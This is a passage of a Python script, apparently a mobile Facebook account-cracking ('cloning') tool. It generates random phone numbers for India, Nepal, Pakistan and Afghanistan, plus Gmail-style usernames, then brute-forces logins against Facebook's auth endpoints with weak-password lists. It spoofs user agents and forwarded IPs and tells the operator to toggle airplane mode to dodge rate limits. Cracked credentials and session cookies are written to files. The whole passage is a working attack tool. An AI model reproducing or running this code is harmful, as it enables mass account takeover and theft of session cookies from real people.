    print(f"\033[91m•->\033[97m TOTAL OK ID \033[97m:{G} {len(oks)}")
    print(f"\033[91m•->\033[97m TOTAL CP ID \033[97m:{R} {len(cps)}")
    linex();exit()
#──────────────{ RANDOM-INDIA }──────────────#
def __india__():
    user=[]
    clear()
    print(f'\033[91m•->\033[97m EXAMPLE \033[97m: \033[92m+91639 \033[97m/ \033[92m+98282 \033[97m/ \033[92m+92627 ');linex()
    code=input(f'\033[91m|\033[97m?\033[91m|\033[92m CHOICE  \033[97m:\033[92m ')
    clear()
    print(f'\033[91m•->\033[97m EXAMPLE \033[97m: \033[92m5000 \033[97m/ \033[92m10000 \033[97m/ \033[92m9999 ');linex()
    try:
        limit=int(input(f'\033[91m|\033[97m?\033[91m|\033[92m CHOICE  \033[97m:\033[92m '))
    except ValueError:
        limit=50000
    clear()
    print(f"\033[91m•->\033[97m METHOD M1 ")
    print(f"\033[91m[\033[97m2\033[91m]\033[97m METHOD M2 ");linex()
    methodx = input(f'\033[91m|\033[97m?\033[91m|\033[92m CHOICE \033[97m:\033[92m ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as FIREx:
        clear()
        tl=str(len(user))
        print(f"\033[91m•->\033[97m METHOD    \033[97m:\033[92m M{methodx} ")
        print(f'\033[91m•->\033[97m SIM CODE  \033[97m:\033[92m {code} ')
        print(f'\033[91m•->\033[97m TOTAL UID \033[97m:\033[92m {tl} ')
        print(f"\033[91m•->\033[97m USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,ids[:7],ids[:6],love[1:],"57273200","5757575"]
            if methodx in ['1']:FIREx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:FIREx.submit(__Randm_M2__,ids,passlist)
    print('');linex()
    print(f"\033[91m•->\033[97m CLONING COMPLETE ")
    print(f"\033[91m•->\033[97m TOTAL OK ID \033[97m:{G} {len(oks)}")
    print(f"\033[91m•->\033[97m TOTAL CP ID \033[97m:{R} {len(cps)}")
    linex();exit()
#──────────────{ RANDOM-NEPAL }──────────────#
def __nepalx__():
    user=[]
    clear()
    print(f'\033[91m•->\033[97m EXAMPLE \033[97m: \033[92m9815 \033[97m/ \033[92m9840 \033[97m/ \033[92m9814 ');linex()
    code=input(f'\033[91m|\033[97m?\033[91m|\033[92m CHOICE  \033[97m:\033[92m ')
    clear()
    print(f'\033[91m•->\033[97m EXAMPLE \033[97m: \033[92m5000 \033[97m/ \033[92m10000 \033[97m/ \033[92m9999 ');linex()
    try:
        limit=int(input(f'\033[91m|\033[97m?\033[91m|\033[92m CHOICE  \033[97m:\033[92m '))
    except ValueError:
        limit=50000
    clear()
    print(f"\033[91m•->\033[97m METHOD M1 ")
    print(f"\033[91m[\033[97m2\033[91m]\033[97m METHOD M2 ");linex()    
    methodx = input(f'\033[91m|\033[97m?\033[91m|\033[92m CHOICE \033[97m:\033[92m ')
    for nmbr in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=45) as FIREx:
        clear()
        tl=str(len(user))        
        print(f"\033[91m•->\033[97m METHOD    \033[97m:\033[92m M{methodx} ")
        print(f'\033[91m•->\033[97m SIM CODE  \033[97m:\033[92m {code} ')
        print(f'\033[91m•->\033[97m TOTAL UID \033[97m:\033[92m {tl} ')
        print(f"\033[91m•->\033[97m USE WIFI+1.1.1.1 VPN");linex()
        
        for love in user:
            ids=code+love
            passlist=[ids,love,ids[:8],ids[:7],ids[:6],'nepal@@12','nepal@123','nepal@1234','nepal@12345','Nepal123','Nepal12345','Nepal@12345','nepal123','FFKing1234']
            if methodx in ['1']:FIREx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:FIREx.submit(__Randm_M2__,ids,passlist)
    print('');linex()
    print(f"\033[91m•->\033[97m CLONING COMPLETE ")
    print(f"\033[91m•->\033[97m TOTAL OK ID \033[97m:{G} {len(oks)}")
    print(f"\033[91m•->\033[97m TOTAL CP ID \033[97m:{R} {len(cps)}")
    linex();exit()
#──────────────{ RANDOM-PAKISTAN }──────────────#
def __pakistan__():
    user=[]
    clear()
    print(f'\033[91m•->\033[97m EXAMPLE \033[97m: \033[92m0306 \033[97m/ \033[92m0315 \033[97m/ \033[92m0345 ');linex()
    code=input(f'\033[91m|\033[97m?\033[91m|\033[92m CHOICE  \033[97m:\033[92m ')
    clear()
    print(f'\033[91m•->\033[97m EXAMPLE \033[97m: \033[92m5000 \033[97m/ \033[92m10000 \033[97m/ \033[92m9999 ');linex()
    try:
        limit=int(input(f'\033[91m|\033[97m?\033[91m|\033[92m CHOICE  \033[97m:\033[92m '))
    except ValueError:
        limit=50000
    clear()
    print(f"\033[91m•->\033[97m METHOD M1 ")
    print(f"\033[91m[\033[97m2\033[91m]\033[97m METHOD M2 ");linex()
    methodx = input(f'\033[91m|\033[97m?\033[91m|\033[92m CHOICE \033[97m:\033[92m ')
    for nmbr in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as FIREx:
        clear()
        tl=str(len(user))
        print(f"\033[91m•->\033[97m METHOD    \033[97m:\033[92m M{methodx} ")
        print(f'\033[91m•->\033[97m SIM CODE  \033[97m:\033[92m {code} ')
        print(f'\033[91m•->\033[97m TOTAL UID \033[97m:\033[92m {tl} ')
        print(f"\033[91m•->\033[97m USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122','123456','1234567890','920176','mariyam123','Hussan786','Ali786','Hassan123','Ahmad12345','mariam786','sobia123','Freefire123','Mughal786','mughal123','Pakistan786'] 
            if methodx in ['1']:FIREx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:FIREx.submit(__Randm_M2__,ids,passlist)
    print('');linex()
    print(f"\033[91m•->\033[97m CLONING COMPLETE ")
    print(f"\033[91m•->\033[97m TOTAL OK ID \033[97m:{G} {len(oks)}")
    print(f"\033[91m•->\033[97m TOTAL CP ID \033[97m:{R} {len(cps)}")
    linex();exit()
#──────────────{ RANDOM-AFGHANISTAN }──────────────#
def __afghanistanx__():
    user=[]
    clear()
    print(f'\033[91m•->\033[97m EXAMPLE \033[97m: \033[92m+9340 \033[97m/ \033[92m+9350 \033[97m/ \033[92m+9330 ');linex()
    code=input(f'\033[91m|\033[97m?\033[91m|\033[92m CHOICE  \033[97m:\033[92m ')
    clear()
    print(f'\033[91m•->\033[97m EXAMPLE \033[97m: \033[92m5000 \033[97m/ \033[92m10000 \033[97m/ \033[92m9999 ');linex()
    try:
        limit=int(input(f'\033[91m|\033[97m?\033[91m|\033[92m CHOICE  \033[97m:\033[92m '))
    except ValueError:
        limit=50000
    clear()
    print(f"\033[91m•->\033[97m METHOD M1 ")
    print(f"\033[91m[\033[97m2\033[91m]\033[97m METHOD M2 ");linex()
    methodx = input(f'\033[91m|\033[97m?\033[91m|\033[92m CHOICE \033[97m:\033[92m ')
    for nmbr in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as FIREx:
        clear()
        tl=str(len(user))
        print(f"\033[91m•->\033[97m METHOD    \033[97m:\033[92m M{methodx} ")
        print(f'\033[91m•->\033[97m SIM CODE  \033[97m:\033[92m {code} ')
        print(f'\033[91m•->\033[97m TOTAL UID \033[97m:\033[92m {tl} ')
        print(f"\033[91m•->\033[97m USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
            if methodx in ['1']:FIREx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:FIREx.submit(__Randm_M2__,ids,passlist)
    print('');linex()
    print(f"\033[91m•->\033[97m CLONING COMPLETE ")
    print(f"\033[91m•->\033[97m TOTAL OK ID \033[97m:{G} {len(oks)}")
    print(f"\033[91m•->\033[97m TOTAL CP ID \033[97m:{R} {len(cps)}")
    linex();exit()
#──────────────{ GMAIL }──────────────#
def __Gmailx__():
    clear()
    user=[]
    print(f"\033[91m•->\033[97m EXAMPLE \033[97m: \033[92mMiraz\033[97m/\033[92mShakib\033[97m/\033[92mRahman\033[97m/\033[92mSumon ");linex();first = input(f'\033[91m|\033[97m?\033[91m|\033[92m FIRST NAME  \033[97m:\033[92m  ')
    clear()
    print(f"\033[91m•->\033[97m EXAMPLE \033[97m: \033[92mHossain\033[97m/\033[92mKhan\033[97m/\033[92mAli\033[97m/\033[92mIslam ");linex();last = input(f'\033[91m|\033[97m?\033[91m|\033[92m LAST NAME  \033[97m:\033[92m ')
    period = '.'
    try:
        clear();print(f'\033[91m•->\033[97m EXAMPLE \033[97m: \033[92m5000 \033[97m/ \033[92m10000 \033[97m/ \033[92m9999 ');linex()
        limit=int(input(f'\033[91m|\033[97m?\033[91m|\033[92m CHOICE  \033[97m:\033[92m '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as FIRExxxx:
        total=str(len(user))
        clear()
        print(f'\033[91m•->\033[97m GMAIL LMT \033[97m:\033[92m {total} ')
        print(f'\033[91m•->\033[97m TAR GMAIL \033[97m:\033[92m {first+last}@gmail.com ')
        print(f"\033[91m•->\033[97m USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for digitx in user:
            username=first+period+last+digitx
            pswrd = [first,last,first+last,first+'123',first+'1234',first+'12345',last+'123',last+'1234',last+'12345']
            FIRExxxx.submit(__GMAILX__,username,pswrd,total)
    print('');linex()
    print(f"\033[91m•->\033[97m CLONING COMPLETE ")
    print(f"\033[91m•->\033[97m TOTAL OK ID \033[97m:{G} {len(oks)}")
    print(f"\033[91m•->\033[97m TOTAL CP ID \033[97m:{R} {len(cps)}")
    linex();exit()
def generate_real_ua():
    devices = [
        "Samsung SM-G970U", "Samsung SM-G973F", "Xiaomi Redmi Note 11",
        "Xiaomi Poco X3", "Vivo Y20", "Oppo F19", "Google Pixel 7"
    ]
    android_versions = ["12", "11", "10", "13"]
    fbav_versions = [f"{x}.0.0.{random.randint(1000,9999)}" for x in range(300, 500)]
    fbbv_versions = [str(random.randint(1000000, 9999999))]
    densities = ["2.0", "3.0", "3.5", "4.0"]
    widths = ["1080", "1440", "720"]
    heights = ["1920", "2340", "3120"]

    device = random.choice(devices)
    android = random.choice(android_versions)
    fbav = random.choice(fbav_versions)
    fbbv = random.choice(fbbv_versions)
    density = random.choice(densities)
    width = random.choice(widths)
    height = random.choice(heights)

    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {android}; {device} Build/{device.replace(' ','')}); "
        f"FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/density={density};width={width};height={height};"
        f"FBLC/en_US;FBRV/{random.randint(100000000,999999999)};FBCR/;FBMF/{device.split()[0]};"
        f"FBBD/{device.split()[0]};FBPN/com.facebook.katana;FBDV/{device};FBSV/{android};"
        f"FBOP/1;FBCA/arm64-v8a;"
    )
    return ua        
#──────────────{ RANDOM-METHOD-M1 }──────────────#
def __Randm_M1__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[91m|\033[92m RUNNING-M1\033[91m|\033[92m {loop} \033[97m| \033[92m{len(oks)} \033[97m| \033[91m{len(cps)}');sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': generate_real_ua(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                print(f'\r\r\x1b[38;5;46m|baba| {str(uid)} | {pas} ')
                                #print(f'\r\r\x1b[38;5;46m|NUM|-> {cid} ')
                                #print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
                                open('/sdcard/Ali/RAND/M1-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                print(f'\r\r{R}|baba-CP| {str(uid)} | {pas} ')
                                open('/sdcard/Ali/RAND/CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass
#──────────────{ RANDOM-METHOD-M2 }──────────────#

# Colors
red = '\x1b[38;5;196m'
green = '\x1b[38;5;46m'
white = '\x1b[38;5;15m'
R = '\x1b[38;5;202m'

# Global counters
loop = 0
oks = []
cps = []

import random

# ---------------------------
# Random IP Generator
# ---------------------------
def random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"


# ---------------------------
# Random Realistic User-Agent Generator (2025)
# ---------------------------
def generate_real_ua():

    brands_models = {
        "Samsung": ["SM-A515F", "SM-A546B", "SM-S911B", "SM-S926B", "SM-M336B"],
        "Xiaomi": ["Redmi Note 13 Pro", "Poco X6 Pro", "Mi 13 Lite", "Mi 14"],
        "Vivo": ["V30", "Y36", "X100", "Y22"],
        "Oppo": ["Reno11", "A78", "Find X7", "A59"],
        "Google": ["Pixel 6", "Pixel 7", "Pixel 8", "Pixel 8 Pro"],
        "OnePlus": ["CPH2447 (11)", "CPH2585 (12)", "IN2011"],
        "Realme": ["RMX3995", "Narzo 70", "GT Neo 6", "RMX3686"],
        "Huawei": ["P60", "Mate 60", "Nova 12"],
        "Infinix": ["X6835 (Hot 40)", "X6528B (Smart 8)", "X6925 (Note 40)"]
    }

    android_versions = ["12", "13", "14", "15"]
    densities = ["2.0", "2.5", "3.0", "3.5", "4.0"]
    widths = ["720", "1080", "1440"]
    heights = ["1600", "1920", "2340", "2400", "3040", "3120"]
    locales = ["en_US", "en_GB", "hi_IN", "ne_NP", "ur_PK", "id_ID"]
    carriers = ["NTC", "Ncell", "Jio", "Airtel", "T-Mobile", "Verizon"]

    # Random selections
    brand = random.choice(list(brands_models.keys()))
    model = random.choice(brands_models[brand])
    android = random.choice(android_versions)
    density = random.choice(densities)
    width = random.choice(widths)
    height = random.choice(heights)
    locale = random.choice(locales)
    carrier = random.choice(carriers)

    fbav = f"{random.randint(350, 450)}.0.0.{random.randint(10,150)}"
    fbbv = str(random.randint(350000000, 550000000))

    # Android build tags for 2025
    build_tag = random.choice(["RP1A", "SP1A", "TP1A"])
    build = f"{build_tag}.{random.randint(210000, 999999)}.{random.randint(10, 99)}"

    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {android}; {model} Build/{build}) "
        f"[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};"
        f"FBDM/{{density={density},width={width},height={height}}};"
        f"FBLC/{locale};FBRV/{random.randint(100000000,999999999)};"
        f"FBCR/{carrier};FBMF/{brand};FBBD/{brand};FBPN/com.facebook.katana;"
        f"FBDV/{model};FBSV/{android};FBOP/{random.choice(['1','10'])};"
        f"FBCA/arm64-v8a,armeabi-v7a:;]"
    )

    return ua

  # current system time
# Main function
def __Randm_M2__(ids, passlist):
    global loop, oks, cps
    loop += 1  # increment at start
    sys.stdout.write(f'\r\r\033[91m[\033[92mRANDOM-BRUTE\033[91m] \033[97m[\033[91m{ids}\033[97m] | \033[92m{loop} \033[97m| \033[92m{len(oks)} \033[97m| \033[91m{len(cps)}')
    sys.stdout.flush()

    ua_agent = generate_real_ua()

    try:
        for pas in passlist:
            access_token = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"

            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "email": ids,
                "password": pas,
                "generate_analytics_claims": "1",
                "cpl": "true",
                "try_num": "1",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "password",
                "source": "login",
                "error_detail_type": "button_with_disabled",
                "enroll_misauth": "false",
                "generate_session_cookies": "1",
                "generate_machine_id": "1",
                "currently_logged_in_userid": "0",
                "locale": "en_GB",
                "client_country_code": "GB",
                "fb_api_req_friendly_name": "authenticate",
                "api_key": "882a8490361da98702bf97a021ddc14d",
                "access_token": access_token
            }

            headers = {
                "User-Agent": ua_agent,
                "Accept-Encoding": "gzip, deflate",
                "Connection": "Keep-Alive",
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "graph.facebook.com",
                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                "Authorization": f"OAuth {access_token}",
                "X-FB-Connection-Type": "MOBILE.LTE",
                "X-Tigon-Is-Retry": "False",
                "x-fb-session-id": str(uuid.uuid4()),
                "x-fb-device-group": "5120",
                "X-FB-Friendly-Name": "ViewerReactionsMutation",
                "X-FB-Request-Analytics-Tags": "graphservice",
                "X-FB-HTTP-Engine": "Liger",
                "X-FB-Client-IP": random_ip(),
                "X-Forwarded-For": random_ip(),
                "X-FB-Server-Cluster": "True",
                "x-fb-connection-token": str(uuid.uuid4())
            }

            try:
                po = requests.post("https://api.facebook.com/auth/login", data=data, headers=headers).json()
            except:
                continue

            # OK result
            if "session_key" in po:
                uid = po.get("uid", ids)
                coki = ";".join(f"{i['name']}={i['value']}" for i in po.get("session_cookies", []))           
                print(f'\r\r\033[92m|baba-ok| {uid} | {pas}')         
                print(f'\r\r\033[92m|COKI|-> {coki}')                
                open('/sdcard/M2-OK.txt','a').write(f'{uid}|{pas}|{coki}\n')
                oks.append(str(uid))
                break

            # CP result
            error_msg = po.get("error", {}).get("message", "")
            if "www.facebook.com" in error_msg:
                uid = po.get("error", {}).get("error_data", {}).get("uid", ids)                             
                print(f'\r\r{R}|baba-CP| {uid} | {pas}')                              
                open('/sdcard/M2-Cp.txt','a').write(f'{uid}|{pas}\n')
                cps.append(str(uid))
                break

    except Exception:
        pass
    
#──────────────{ GMAIL-METHOD }──────────────#

#──────────────{ END }──────────────#
if __name__ == "__main__":
    try:os.mkdir('baba')
    except:pass
    menu()
